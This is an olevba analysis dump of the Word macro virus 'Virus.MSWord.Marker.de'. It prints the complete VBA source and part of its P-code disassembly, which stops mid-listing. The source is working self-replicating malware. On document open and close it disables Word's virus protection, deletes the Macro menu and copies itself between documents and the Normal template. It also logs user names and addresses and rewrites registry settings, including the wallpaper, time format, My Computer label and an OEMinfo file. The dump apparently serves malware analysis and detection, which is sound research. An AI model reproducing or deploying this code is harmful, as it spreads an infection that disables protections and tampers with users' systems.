olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.de
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.de - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Son, Be a Good Boy !
Const Marker = "<- this is a marker! by fs2000"

Private Sub Document_Open()
    Document_Close
End Sub
Private Sub Document_Close()
    Dim nmod As Object
    Dim isd As String
    Dim DS, NTS, DI, NTI As Boolean
    Dim EmailMe, Users, LogData, LogFile As String
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    AddIns.Unload True
    Options.VirusProtection = False
    Application.UserName = "fs080298"
    Application.UserInitials = "FS2000"
    Application.UserAddress = "fs080298@yeayea.com"
    Application.EnableCancelKey = wdCancelDisabled
    GoSub Sisipin
    If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
    "LogData in") = False) Then GoSub LoggingIn
    GoSub EmailMePlease
    GoTo Finish
    
Sisipin:
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
    If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
        If DI Then
            NTS = NormalTemplate.Saved
            EmailMe = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
        For i = 1 To Len(Application.UserAddress)
            If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
                If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
                    Users = Users & Mid(Application.UserAddress, i, 1)
                End If
            Else
                Users = Users & Chr(13) & " '"
            End If
        Next
    EmailMe = EmailMe & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
    NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
    NT.CodeModule.AddFromString EmailMe
    If NTS Then NormalTemplate.Save
    End If
    If NTI Then
        DS = ActiveDocument.Saved
        EmailMe = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
        AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
        AD.CodeModule.AddFromString EmailMe
        If DS Then ActiveDocument.Save
        End If
    End If
    Return
    
LoggingIn:
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
    GoSub EmailMePlease
    Return

EmailMePlease:
    Dim SystemRoot As String
    On Error Resume Next
    SystemRoot = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s1159") = Chr$(60) + Chr$(40) + Chr$(164) + Chr$(191) + Chr$(164) + Chr$(41) + Chr$(62)
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "sTimeFormat") = "HH:mm:ss tt"
    Open SystemRoot & "\EmailMe.html" For Output As #1
        Print #1, "<html><head><title>Email Me !</title></head><body bgcolor='#000000' link='#FFFF00' vlink='#00FFFF'>"
        Print #1, "<p align='right'><font color='#80FF00' size='3' face='Arial'><marquee scrollamount='3' width='53%'> © Have a Nice Day ! - Don't Forget to Save Your Data...</marquee></font></p>"
        Print #1, "<h6 align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
        Print #1, "<p align='center'><font color='#FF80FF' size='7'><marquee behavior='alternate' width='11%'>ÒÓ</marquee></font>"
        Print #1, "<p align='center'><font color='#FF80FF' size='7'><strong>¯</strong></font></p>"
        Print #1, "<p align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
        Print #1, "<p><br><br><br><br><br></p>"
        Print #1, "<p align='right'><a href='mailto:fs080298@yeayea.com'><font size='2'>Email Me !</font></a></p></Body></html>"
        Print #1, "<Script Language='VBS'>"
        Print #1, "Sub button1_onClick()"
        Print #1, "alert " + Chr$(34) + "I Said : Don`t Press Me ! Can`t You Read ?" + Chr$(34)
        Print #1, "End Sub"
        Print #1, "</script>"
        Print #1, "<p align='right'><INPUT TYPE='BUTTON' NAME='Button1' VALUE='Don`t Press Me !'></p>"
    Close #1
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = SystemRoot & "\EmailMe.html"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\International", "s2359") = Chr$(60) + Chr$(40) + Chr$(169) + Chr$(191) + Chr$(169) + Chr$(41) + Chr$(62)
        If System.Version = 4.1 Then
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = Chr$(72) + Chr$(105) + Chr$(32) + Chr$(33) + Chr$(32) + Chr$(72) + Chr$(111) + Chr$(119) + Chr$(32) + Chr$(65) + Chr$(114) + Chr$(101) + Chr$(32) + Chr$(89) + Chr$(111) + Chr$(117) + Chr$(32) + Chr$(84) + Chr$(111) + Chr$(100) + Chr$(97) + Chr$(121) + Chr$(46) + Chr$(46) + Chr$(46)
            System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "InfoTip") = "Hi ! Thanks for Looking My Wallpaper..."
        Else
            System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = Chr$(72) + Chr$(105) + Chr$(32) + Chr$(33) + Chr$(32) + Chr$(72) + Chr$(111) + Chr$(119) + Chr$(32) + Chr$(65) + Chr$(114) + Chr$(101) + Chr$(32) + Chr$(89) + Chr$(111) + Chr$(117) + Chr$(32) + Chr$(84) + Chr$(111) + Chr$(100) + Chr$(97) + Chr$(121) + Chr$(46) + Chr$(46) + Chr$(46)
        End If
    myoem = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot") + Chr$(92) + Chr$(83) + Chr$(121) + Chr$(115) + Chr$(116) + Chr$(101) + Chr$(109)
    myini$ = Chr$(92) + Chr$(79) + Chr$(101) + Chr$(109) + Chr$(105) + Chr$(110) + Chr$(102) + Chr$(111) + Chr$(46) + Chr$(105) + Chr$(110) + Chr$(105)
    Open myoem & myini$ For Output As #2
        Print #2, "[general]"
        Print #2, "Manufacturer=FS080298 CORP. 98"
        Print #2, "Model=Son, I Love You So Much !"
        Print #2, ""
        Print #2, "[Support Information]"
        Print #2, "Line1=THank`s For Looking My Wallpaper"
        Print #2, "Line2=My Program Is Not DANGER !"
        Print #2, "Line3=Don`t Worry !!!"
        Print #2, "Line4="
        Print #2, "Line5=Do You Have Any Comments ?"
        Print #2, "Line6=Please Send Your Email to : fs080298@yeayea.com"
        Print #2, "Line7=:-)"
    Close #2
Return
Finish:
End Sub

'Thank for looking my wallpaper
'Special Thank To :

' 08:32:498:32:49 AM AM-Thursday, 9 Dec 1999
' fs080298
' fs080298@yeayea.com

 


' 08:24:568:24:56 AM AM-Tuesday, 21 Dec 1999
' fs080298
' fs080298@yeayea.com

 


' 06:06:3818:06:38 -÷åòâåðã, 9 ìàð 2000
' fs080298
' fs080298@yeayea.com

 


' 02:15:462:15:46 PM PM-Tuesday, 11 Apr 2000
' fs080298
' fs080298@yeayea.com

 


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.de
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12456 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Son, Be a Good Boy !"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x001E "<- this is a marker! by fs2000"
' 	VarDefn Marker
' Line #2:
' Line #3:
' 	FuncDefn (Private Sub Document_Open())
' Line #4:
' 	ArgsCall Document_Close 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub Document_Close())
' Line #7:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #8:
' 	Dim 
' 	VarDefn isd (As String)
' Line #9:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #10:
' 	Dim 
' 	VarDefn EmailMe
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #13:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' 	LitStr 0x0008 "fs080298"
' 	Ld Application 
' 	MemSt UserName 
' Line #16:
' 	LitStr 0x0006 "FS2000"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #17:
' 	LitStr 0x0013 "fs080298@yeayea.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #18:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #19:
' 	GoSub Sisipin 
' Line #20:
' 	LineCont 0x0004 0A 00 04 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #21:
' 	GoSub EmailMePlease 
' Line #22:
' 	GoTo Finish 
' Line #23:
' Line #24:
' 	Label Sisipin 
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #27:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #28:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #29:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #30:
' 	Ld DI 
' 	IfBlock 
' Line #31:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St EmailMe 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #34:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #35:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #36:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Next 
' Line #42:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld EmailMe 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St EmailMe 
' Line #43:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #44:
' 	Ld EmailMe 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #45:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	Ld NTI 
' 	IfBlock 
' Line #48:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St EmailMe 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #51:
' 	Ld EmailMe 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #52:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Return 
' Line #56:
' Line #57:
' 	Label LoggingIn 
' Line #58:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #59:
' 	GoSub EmailMePlease 
' Line #60:
' 	Return 
' Line #61:
' Line #62:
' 	Label EmailMePlease 
' Line #63:
' 	Dim 
' 	VarDefn SystemRoot (As String)
' Line #64:
' 	OnError (Resume Next) 
' Line #65:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St SystemRoot 
' Line #66:
' 	LitDI2 0x003C 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0028 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x0005 "s1159"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #67:
' 	LitStr 0x000B "HH:mm:ss tt"
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x000B "sTimeFormat"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #68:
' 	Ld SystemRoot 
' 	LitStr 0x000D "\EmailMe.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "<html><head><title>Email Me !</title></head><body bgcolor='#000000' link='#FFFF00' vlink='#00FFFF'>"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00B0 "<p align='right'><font color='#80FF00' size='3' face='Arial'><marquee scrollamount='3' width='53%'> © Have a Nice Day ! - Don't Forget to Save Your Data...</marquee></font></p>"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x00C6 "<h6 align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006E "<p align='center'><font color='#FF80FF' size='7'><marquee behavior='alternate' width='11%'>ÒÓ</marquee></font>"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004E "<p align='center'><font color='#FF80FF' size='7'><strong>¯</strong></font></p>"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0097 "<p align='center'><font color=brown size='7'><marquee behavior='alternate' width='100%'>¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤</marquee></font>"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "<p><br><br><br><br><br></p>"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006C "<p align='right'><a href='mailto:fs080298@yeayea.com'><font size='2'>Email Me !</font></a></p></Body></html>"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "<Script Language='VBS'>"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "Sub button1_onClick()"
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "alert "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x002A "I Said : Don`t Press Me ! Can`t You Read ?"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "</script>"
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0052 "<p align='right'><INPUT TYPE='BUTTON' NAME='Button1' VALUE='Don`t Press Me !'></p>"
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #84:
' 	Ld SystemRoot 
' 	LitStr 0x000D "\EmailMe.html"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #85:
' 	LitDI2 0x003C 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0028 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_CURRENT_USER\Control Panel\International"
' 	LitStr 0x0005 "s2359"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #86:
' 	Ld System 
' 	MemLd Version 
' 	LitR8 0x6666 0x6666 0x6666 0x4010 
' 	Eq 
' 	IfBlock 
' Line #87:
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #88:
' 	LitStr 0x0027 "Hi ! Thanks for Looking My Wallpaper..."
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0007 "InfoTip"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #89:
' 	ElseBlock 
' Line #90:
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x005C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr$ 0x0001 
